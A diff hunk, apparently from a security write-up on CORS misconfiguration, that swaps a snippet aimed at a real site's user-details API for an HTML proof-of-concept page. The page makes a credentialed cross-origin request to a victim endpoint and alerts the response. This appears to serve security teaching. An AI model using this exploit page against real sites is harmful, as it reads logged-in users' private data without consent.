@@ -6,19 +6,29 @@ CORS short of Cross-Origin Resource Sharing is a policy that allows a site to sh
 
 Place following code in the site you control:
 
-```js
-function cors() {
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-document.getElementById(“demo”).innerHTML =
-alert(this.responseText);
-}
-};
-xhttp.open(“GET”, “https://api.artsy.net/api/user_details/<User-ID>”, true);
-xhttp.withCredentials = true;
-xhttp.send();
-}
+```html
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://victim.example.com/endpoint", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
 ```
 
 ## Some misconfiguration example
